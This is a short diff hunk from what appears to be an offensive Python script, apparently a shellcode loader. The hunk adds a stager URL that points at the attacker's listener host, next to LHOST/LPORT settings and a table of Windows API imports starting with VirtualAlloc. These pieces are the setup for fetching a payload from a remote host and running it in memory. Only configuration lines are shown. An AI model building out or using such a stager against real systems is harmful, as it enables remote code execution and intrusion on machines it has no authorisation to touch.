@@ -9,6 +9,7 @@ import subprocess
 
 LHOST = "192.168.49.65"
 LPORT = "443"
+STAGER_URL = f"http://{LHOST}/sc"
 
 DLL_IMPORT = {
   "VirtualAlloc": "",
